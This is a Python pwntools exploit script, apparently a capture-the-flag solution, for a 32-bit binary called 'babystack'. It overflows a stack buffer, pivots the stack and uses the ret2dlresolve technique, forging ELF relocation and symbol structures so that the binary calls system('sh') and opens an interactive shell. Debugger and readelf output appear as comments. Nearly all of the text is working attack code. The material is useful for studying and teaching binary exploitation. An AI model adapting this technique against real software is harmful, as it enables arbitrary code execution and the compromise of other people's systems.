main_addr = 0x8048457
fun_addr = 0x804843b

from pwn import *

elf = ELF("./babystack")
p = elf.process()
# gdb.attach(p)

'''
pwndbg> x/3i 0x8048300
   0x8048300 <read@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048306 <read@plt+6>:	push   0x0
   0x804830b <read@plt+11>:	jmp    0x80482f0
'''

resolver = 0x80482f0	# push link_map and call dl_resolve
buf = 0x804af00		# controllable area | segment rw-p
leave_ret = 0x80483a8	# 0x080483a8 : leave ; ret

'''
$ readelf -d pwn | egrep "JMPREL|STRTAB|SYMTAB"

0x00000005 (STRTAB)                     0x804822c
0x00000006 (SYMTAB)                     0x80481cc
0x00000017 (JMPREL)                     0x80482b0
'''

STRTAB = 0x804822c
SYMTAB = 0x80481cc
JMPREL = 0x80482b0

read_plt = 0x8048300
read_got = 0x804a00c

# Pivoting the stack and calling read(0, buf, 0x80) for the rest of the payload
buffer = ""
buffer += "A" * 40
buffer += p32(buf)	# stack pivoting. (esp = buff)
buffer += p32(elf.plt["read"]) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80)

# Compute offsets and forged structures
forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8	# size of elf32_sym

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) 	# align to 0x10

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7

elf32_rel = p32(elf.got["read"]) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

# Rest of the payload: dl-resolve hack :) (the real deal)
buffer2 = "AAAA" 		# fake ebp
buffer2 += p32(resolver)	# ret2dlresolve
buffer2 += p32(rel_offset)	# JMPREL + offset = struct
buffer2 += "AAAA"		# fake return 
buffer2 += p32(buf+100)		# system parameter
buffer2 += elf32_rel		# (buf+0x14)
buffer2 += "A" * align
buffer2 += elf32_sym_struct 	# (buf+0x20)
buffer2 += "system\x00"
length = (100 - len(buffer2))
buffer2 += "A" * length
buffer2 += "sh\x00"
length = (0x80 - len(buffer2)) 
buffer2 += "A" * length

payload = buffer + buffer2

p.send(payload) 
p.interactive()

